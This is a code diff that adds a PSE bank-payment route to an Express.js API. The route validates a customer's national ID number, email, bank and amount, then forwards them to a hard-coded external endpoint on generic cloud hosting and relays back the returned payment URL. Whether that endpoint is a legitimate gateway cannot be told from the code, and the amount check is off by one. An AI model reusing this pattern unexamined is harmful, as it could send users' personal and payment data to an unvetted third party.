@@ -754,4 +754,146 @@ router.get('/health', (req, res) => {
     });
 });
 
+// ========================================
+// PSE - PASARELA DE PAGOS
+// ========================================
+
+// Rate limiting para PSE
+const pseRateLimit = new Map();
+const PSE_RATE_LIMIT_MS = 30000; // 30 segundos
+
+// Lista de bancos permitidos
+const allowedBanks = [
+    "ALIANZA FIDUCIARIA", "BAN100", "BANCAMIA S.A.", "BANCO AGRARIO", "BANCO AV VILLAS",
+    "BANCO BBVA COLOMBIA S.A.", "BANCO CAJA SOCIAL", "BANCO COOPERATIVO COOPCENTRAL",
+    "BANCO DE BOGOTA", "BANCO DE OCCIDENTE", "BANCO FALABELLA", "BANCO FINANDINA S.A. BIC",
+    "BANCO GNB SUDAMERIS", "BANCO ITAU", "BANCO J.P. MORGAN COLOMBIA S.A.",
+    "BANCO MUNDO MUJER S.A.", "BANCO PICHINCHA S.A.", "BANCO POPULAR",
+    "BANCO SANTANDER COLOMBIA", "BANCO SERFINANZA", "BANCO UNION antes GIROS", "BANCOLOMBIA",
+    "BANCOOMEVA S.A.", "BOLD CF", "CFA COOPERATIVA FINANCIERA", "CITIBANK", "COINK SA",
+    "COLTEFINANCIERA", "CONFIAR COOPERATIVA FINANCIERA", "COTRAFA", "Crezcamos-MOSi", "DALE",
+    "DING", "FINANCIERA JURISCOOP SA COMPANIA DE FINANCIAMIENTO", "GLOBAL66", "IRIS",
+    "JFK COOPERATIVA FINANCIERA", "LULO BANK", "MOVII S.A.", "NEQUI", "NU", "POWWI",
+    "RAPPIPAY", "SCOTIABANK COLPATRIA", "UALA"
+];
+
+/**
+ * POST /api/pse.php
+ * Procesar pago PSE
+ */
+router.post('/pse.php', async (req, res) => {
+    try {
+        // Obtener IP del cliente
+        const clientIP = req.ip || req.connection.remoteAddress || 'unknown';
+
+        // Rate limiting
+        const lastRequest = pseRateLimit.get(clientIP);
+        if (lastRequest && Date.now() - lastRequest < PSE_RATE_LIMIT_MS) {
+            return res.status(429).json({
+                Error: "Demasiadas solicitudes. Intenta de nuevo en 30 segundos."
+            });
+        }
+        pseRateLimit.set(clientIP, Date.now());
+
+        // Obtener datos del request (soporta JSON y form-urlencoded)
+        let amount, bank, correo, documento;
+
+        if (req.is('application/json')) {
+            amount = req.body.total;
+            bank = req.body.bank;
+            correo = req.body.email;
+            documento = req.body.identification;
+        } else {
+            // Form urlencoded
+            amount = req.body.amount;
+            bank = req.body.bankCode || req.body.bank;
+            correo = req.body.Correo || req.body.email;
+            documento = req.body.Documento || req.body.identification;
+        }
+
+        // Sanitizar
+        amount = parseInt(amount, 10);
+        bank = (bank || '').replace(/[^a-zA-Z0-9\s.\-]/g, '').trim();
+        correo = (correo || '').toLowerCase().replace(/[^a-z0-9@._\-]/g, '').trim();
+        documento = (documento || '').replace(/[^0-9]/g, '');
+
+        // Validaciones
+        if (!amount || amount <= 2000) {
+            return res.status(400).json({
+                Error: "Monto invalido. El monto minimo es $2.000 COP"
+            });
+        }
+
+        if (!bank) {
+            return res.status(400).json({
+                Error: "Debe seleccionar un banco"
+            });
+        }
+
+        if (!allowedBanks.includes(bank)) {
+            return res.status(400).json({
+                Error: "Banco no permitido: " + bank
+            });
+        }
+
+        if (!documento || documento.length < 5) {
+            return res.status(400).json({
+                Error: "Numero de documento invalido"
+            });
+        }
+
+        const emailRegex = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+        if (!correo || !emailRegex.test(correo)) {
+            return res.status(400).json({
+                Error: "Correo electronico invalido"
+            });
+        }
+
+        // Llamar a la API PSE externa
+        const pseUrl = "https://phpclusters-196676-0.cloudclusters.net/apipsedaviplata2/PSE.php";
+        const params = new URLSearchParams({
+            Documento: documento,
+            Correo: correo,
+            Banco: bank,
+            Monto: amount.toString()
+        });
+
+        console.log(`[PSE] Procesando pago: ${bank}, Monto: ${amount}, Doc: ${documento.substring(0, 4)}***`);
+
+        const response = await fetch(pseUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
+            },
+            body: params.toString()
+        });
+
+        if (!response.ok) {
+            throw new Error(`HTTP ${response.status}`);
+        }
+
+        const responseText = await response.text();
+
+        // Intentar parsear como JSON
+        try {
+            const jsonResponse = JSON.parse(responseText);
+            return res.json(jsonResponse);
+        } catch {
+            // Si no es JSON, verificar si es una URL
+            const trimmed = responseText.trim();
+            if (trimmed.startsWith('http')) {
+                return res.json({ URL: trimmed });
+            }
+            return res.json({ response: responseText });
+        }
+
+    } catch (error) {
+        console.error('[PSE] Error:', error.message);
+        res.status(500).json({
+            Error: "Fallo la conexion al servidor de pagos",
+            Details: "Por favor intente nuevamente en unos momentos"
+        });
+    }
+});
+
 module.exports = router;
